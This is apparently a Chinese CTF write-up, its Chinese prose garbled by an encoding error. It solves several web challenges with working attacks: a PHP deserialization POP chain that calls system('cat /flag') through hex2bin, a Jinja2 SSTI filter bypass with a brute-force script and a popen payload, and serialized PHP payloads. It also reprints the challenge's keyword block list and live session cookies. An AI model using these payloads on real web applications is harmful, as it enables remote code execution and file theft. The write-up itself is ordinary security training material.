<p>å…¶å®å°±æ˜¯ç›¸å½“äºç”¨call_user_funcè°ƒç”¨å‡½æ•°Aï¼Œé€šè¿‡A(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo stretchy="false">)</mo><mtext>è°ƒç”¨å‡½æ•°</mtext><mi>B</mi><mtext>ï¼Œç„¶å</mtext><mi>B</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">c)è°ƒç”¨å‡½æ•°Bï¼Œç„¶åB(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mord cjk_fallback">è°ƒ</span><span class="mord cjk_fallback">ç”¨</span><span class="mord cjk_fallback">å‡½</span><span class="mord cjk_fallback">æ•°</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ç„¶</span><span class="mord cjk_fallback">å</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">(</span></span></span></span>d)å®ç°rce</p>
<p>é‚£ä¹ˆè¦æ€ä¹ˆæŒ‘é€‰å‘¢ï¼Ÿ</p>
<p>é¦–å…ˆå¯ä»¥æ ¹æ®<code>$b</code>æ˜¯ä¸€ä¸ªæ•°ç»„å¯ä»¥ç¡®å®š<code>$a</code>æ˜¯ä¸€ä¸ªè·å–åˆ°æ•°ç»„<strong>çš„é”®æˆ–è€…å€¼çš„å‡½æ•°ï¼Œæ— å‚rceé‡Œçš„å‡ ä¸ªå‡½æ•°å¯ä»¥åˆ©ç”¨å¾—åˆ°</strong></p>
<p>æˆ‘è¿™è¾¹å°±æŒ‘é€‰äº†array_randï¼Œä¸è¿‡ä»–æ˜¯éšæœºçš„ï¼Œä½†æ˜¯æ•°ç»„é•¿åº¦åªæœ‰1ï¼Œæ‰€ä»¥<code>array_rand</code>å°±æ˜¯ç¡®å®šçš„</p>
<p>é€šè¿‡<code>array_rand</code>èƒ½å¤Ÿè·å–åˆ°é”®åï¼Œè€Œä¸”å®ƒçš„é”®åæ˜¯ä¸€ä¸ªå‡½æ•°åï¼Œæˆ‘è¿™è¾¹é€‰äº†<code>hex2bin</code></p>
<p>åˆ©ç”¨<code>hex2bin</code>æ¥è°ƒç”¨systemï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;73797374656d&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨systemè·å–åˆ°flagå³å¯ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//call_user_func($a,$b);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> AAA;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> BBB;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> CCC;</span><br><span class="line"><span class="variable">$c</span>-&gt;c = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;s = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;c = <span class="string">&#x27;73797374656d&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;d = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$c</span>, <span class="number">1</span>=&gt;<span class="literal">null</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:1&quot;</span>, <span class="string">&quot;i:0&quot;</span>, <span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//POSTä¼ å…¥ï¼ša=array_rand&amp;hex2bin=ä»»æ„</span></span><br></pre></td></tr></table></figure>
<h1><span id="ezmake"> ez?make</span></h1>
<p>åå¼•å·å‘½ä»¤æ‰§è¡Œåå¼¹shellï¼š</p>
<img src="/posts/52072/image-20240402115041263.png" class title="awa">
<img src="/posts/52072/image-20240402115052932.png" class title="awa">
<p>å¯ä»¥çœ‹åˆ°æºç è¿‡æ»¤äº†è¿™äº›</p>
<h1><span id="æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº"> æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº</span></h1>
<p>å…¶å®è¿™ä¸ªé¢˜ä¸€å¥è¯å°±å¯ä»¥å¸¦è¿‡ï¼š</p>
<p>å¼±å¯†ç çˆ†ç ´+<code>requests.values.xx</code>ä¼ å‚ç»•ssti</p>
<p>å¼±å¯†ç é€‰äº†ä¸ª<code>asdqwe</code>ï¼Œç”¨fuzzdict-masterå¯ä»¥çˆ†çš„å‡ºæ¥(<code>æŸé›†å›¢å¸¸ç”¨å¼±å£ä»¤å­—å…¸</code>)</p>
<p>è¾“å…¥æ¡†è¾“å…¥ä¸­æ–‡ä»¥åå‡ºçš„å¤§æ‹¬å·æ‰æ˜¯sstiç”¨çš„å¤§æ‹¬å·</p>
<p>ğŸ¤”ï¼Œæ€»ä¹‹å°±æ˜¯ä¸­æ–‡è¿™å—æ¯”è¾ƒéš¾æƒ³ã€‚è¿˜æ˜¯é˜Ÿå‹å¸®å¿™æµ‹å‡ºæ¥çš„</p>
<p>æ‰¾ä¸€ä¸‹os_warp_close:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#http://xyctf.top:52468/index?sentence=()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(1)%E5%95%8A%E5%95%8A&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xyctf.top:54392/index?sentence=&#x27;</span></span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&quot;GZCTF_Token&quot;</span>:<span class="string">&quot;CfDJ8NASxn5J2mJJj3Gt7corBUbSwDa7Z_ojKNGoBIbbzBU0hAxYZnr8o2OyMArTsjctK9kyOFL9rVJpSIyC2a932lZDu4qGq5RtSxgFdbp9N9X5NeWJTW9kTR4I0VSOKyYuh2R2AySdVleI6aDmvCPqkZxcCmKrM-Qp9qnwmz4svu_bHJNYitc72QRcrFgGHc18fwKDItYc7hjDWTPSIYbESQpXfJW5WNh_5jgrsi-HDIr6i0NjILiJyQvIGhC9xMckM5MpK8I_gy2DZizRVghTFimuONxXtgQrMsuR3vF6ZEEpwr19X0AuGRSJZ85vg2dADK6BItD3joDohRn27dwXgVAJZc2hB5H-hzlyNrjmHvMVKCrei3hXyXQyVUJUWUmtix-XSoXnt8V4QS18nOt1Y6D3VXjiRBfRSd9oxess86MonuTbNiv38YV327JNptezmUYZOYdge8R2sttB9EWuVCvq-y0H7xnOYcr6-O0a3oa0k6uOXlgAdPwjtLfJbHUQKRlsN5p--qS6-OdkhRbm33Vqyhgwx8KjHJlIfYZ3N99CLx59zXM2yofyCdSZyJsCC-JzfF39QSlzHrCQdp1OmpHSJbmIpPb5RY5bur8B0FI0ZdgyhNIldRxBbNOIa25jNidBc_982OPVERERTSsSRj-XwDtkuAwGMHN53mHmswj8GzV2zpx9cnB3WpXamuhM9Own_MKYuUZb4Ce3lrbo8ZI&quot;</span>,</span><br><span class="line">    <span class="string">&quot;session&quot;</span>:<span class="string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIn0.ZgvBIA.pXr_8buAz08pydb04GAhCf2KoT4&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">    req_url = url + <span class="string">f&#x27;()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(<span class="subst">&#123;i&#125;</span>)%E5%95%8A%E5%95%8A&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&#x27;</span></span><br><span class="line">    res = requests.get(url=req_url, cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]Found &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]Testing &quot;</span> + <span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>
<p>payloadå¾ˆç®€å•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sentence=(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.g)(request.values.h)).read()å•Šå•Š&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen&amp;h=cat /flag</span><br></pre></td></tr></table></figure>
<p>åŠ ä¸¤ä¸ªä¸­æ–‡å°±æœ‰ä¸¤ä¸ªå¤§æ‹¬å·ï¼Œssti</p>
<p>ç”¨<code>admin asdqwe</code>ç™»å½•å³å¯ï¼Œsstiå®Œäº†ç®€å•æ‰’ä¸ªæºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.secret_key = <span class="string">&#x27;lzlcnb&#x27;</span> </span><br><span class="line"><span class="comment"># è®¾ç½®ä¼šè¯å¯†é’¥ï¼Œç”¨äºåŠ å¯†ä¼šè¯æ•°æ®</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(): </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>: </span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>] </span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>] </span><br><span class="line">        <span class="comment"># è¿›è¡Œç™»å½•éªŒè¯é€»è¾‘ï¼Œå¦‚éªŒè¯ç”¨æˆ·åå¯†ç æ˜¯å¦åŒ¹é…ç­‰ </span></span><br><span class="line">        <span class="comment"># ç™»å½•éªŒè¯æˆåŠŸ </span></span><br><span class="line">        <span class="keyword">if</span> username==<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password==<span class="string">&#x27;asdqwe&#x27;</span>: </span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username </span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>) </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session: </span><br><span class="line">        <span class="keyword">try</span>: </span><br><span class="line">            <span class="comment"># word=request.args.get(&#x27;sentence&#x27;) # if word==&quot;&#123;&#123;&#125;&#125;&quot;: </span></span><br><span class="line">            <span class="comment"># word=None flag=0 word = request.args.get(&#x27;sentence&#x27;) </span></span><br><span class="line">            balck_array=[<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;url_for&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;nc&#x27;</span>,<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>] </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> balck_array: </span><br><span class="line">                <span class="keyword">if</span> word!=<span class="literal">None</span> <span class="keyword">and</span> i <span class="keyword">in</span> word: word=<span class="string">&quot;what are you doing,little hacker&quot;</span> </span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line">            <span class="keyword">if</span> word <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: </span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(word)): </span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">ord</span>(word[i])&gt;<span class="number">128</span>: word=<span class="string">&#x27;&#123;&#x27;</span>+word[<span class="number">0</span>:i]+word[i+<span class="number">1</span>:]+<span class="string">&#x27;&#125;&#x27;</span> </span><br><span class="line">                    flag+=<span class="number">1</span> </span><br><span class="line">            <span class="keyword">else</span>: word=<span class="string">&quot;what do you want to say&quot;</span> </span><br><span class="line">            <span class="keyword">if</span> flag: </span><br><span class="line">                word=<span class="string">&quot;æˆ‘åªèƒ½çœ‹æ‡‚ä½ è¯´çš„è‹±æ–‡(ï¼ï¹ï¼œ)&quot;</span>+word </span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;&#123;&#123;&#125;&#125;&quot;</span> <span class="keyword">in</span> word: word = word.replace(<span class="string">&quot;&#123;&#123;&#125;&#125;&quot;</span>,<span class="string">&#x27;&#123; &#123;&#125;&#125;&#x27;</span>) </span><br><span class="line">                html=<span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">                &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº&lt;/title&gt; &lt;style&gt; body &#123;&#123; font-family: Arial, sans-serif; background-image: url(&#x27;/static/yourname.jpg&#x27;); /* æ›¿æ¢ &#x27;background.jpg&#x27; ä¸ºæ‚¨æƒ³è¦è®¾ç½®çš„èƒŒæ™¯å›¾ç‰‡è·¯å¾„ */ background-size: cover; background-position: center; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; &#125;&#125; form &#123;&#123; background-color: rgba(255, 255, 255, 0.8); padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); width: 800px; &#125;&#125; h2 &#123;&#123; text-align: center; color: #333; &#125;&#125; label &#123;&#123; display: block; margin-top: 10px; color: #555; &#125;&#125; input[type=&quot;text&quot;], input[type=&quot;password&quot;] &#123;&#123; width: 100%; padding: 8px; margin-top: 4px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; &#125;&#125; input[type=&quot;submit&quot;] &#123;&#123; width: 100%; padding: 8px; margin-top: 10px; background-color: #007bff; color: #fff; border: none; border-radius: 4px; cursor: pointer; &#125;&#125; input[type=&quot;submit&quot;]:hover &#123;&#123; background-color: #0056b3; &#125;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;/index&quot; method=&quot;get&quot;&gt; &lt;h2&gt;æˆ‘çš„å®ï¼Œä½ è¯´ä»€ä¹ˆæˆ‘å°±è¯´ä»€ä¹ˆ&lt;/h2&gt; &lt;label for=&quot;sentence&quot;&gt;ä½ æƒ³è¯´çš„è¯&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;sentence&quot; name=&quot;sentence&quot; required&gt; &lt;input type=&quot;submit&quot; value=&quot;tell me&quot;&gt; &lt;h2&gt;&#123;&#125;&lt;/h2&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(word) </span><br><span class="line">                <span class="keyword">return</span> render_template_string(html) </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;å‡ºç°äº†ä¸€ç‚¹å°é—®é¢˜&quot;</span> </span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<h1><span id="ezserialize"> ezSerialize</span></h1>
<p>ç¬¬ä¸€å±‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;password = &amp;<span class="variable">$a</span>-&gt;token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>æ¥åˆ°<code>/fpclosefpclosefpcloseffflllaaaggg.php</code>(ç¬¬äºŒå±‚)</p>
<p>ç»ˆç‚¹ç±»ï¼š</p>
<p><code>C::__call</code></p>
<p>é“¾å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C::__call &lt;- A:: __invoke &lt;- B::__get &lt;- D::__toString &lt;- E::__unserialize </span><br></pre></td></tr></table></figure>
<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰“ä¸ä¸Šå»</p>
<p>ç»•wakeupçš„ï¼Œç‰ˆæœ¬ä¼°è®¡æ˜¯7.3äº†ï¼Œï¼Œï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ArrayObject&quot;</span>:<span class="number">4</span>:&#123;i:<span class="number">0</span>;i:<span class="number">0</span>;i:<span class="number">1</span>;O:<span class="number">1</span>:<span class="string">&quot;E&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;xxxxx&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;D&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;lao&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;luo&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mack&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;wang1&quot;</span>;N;&#125;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;chen&quot;</span>;N;&#125;&#125;i:<span class="number">2</span>;a:<span class="number">0</span>:&#123;&#125;i:<span class="number">3</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸ç»•çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;E&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;xxxxx&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;D&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;lao&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;luo&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mack&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;wang1&quot;</span>;N;&#125;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;chen&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
